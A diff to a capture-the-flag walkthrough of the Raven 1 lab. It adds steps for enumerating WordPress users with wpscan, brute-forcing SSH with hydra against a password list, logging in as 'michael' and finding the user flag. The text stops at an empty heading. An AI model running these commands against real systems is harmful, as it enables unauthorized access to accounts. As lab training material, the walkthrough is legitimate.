@@ -53,4 +53,29 @@
 
 1. Enumerate users of WordPress  
     * Use WPScan  
+    ![Result-wpscan](./img/raven1_server7.png)  
         - `wpscan --url $URL/wordpress --enumerate u`  
+        - "michael" and "steven" are confirmed  
+    * Make users list  
+    ![names.txt](./img/raven1_server8.png)  
+        - `cat > names.txt`  
+
+## Execution (First Try)  
+1. Find SSH password  
+    * Use Hydra (Because we analyze SSH password)  
+        - `hydra ssh://$IP -L names.txt -P /usr/share/john/password.lst -v -t 4`  
+        - The "michael" password: **michael**  
+
+1. Access to the SSH service  
+    * Use the username and the password of the Hydra's results  
+    ![SSH-access](./img/raven1_server9.png)  
+        - `ssh michael@$192.168.56.110`  
+        - Password: **michael**  
+
+## Credential Access  for general user  
+1. Open the user's flag  
+    * There is a flag file in /var/www directory  
+    ![User-flag](./img/raven1_server10.png)  
+
+## Execution (Second Try)  
+1. 
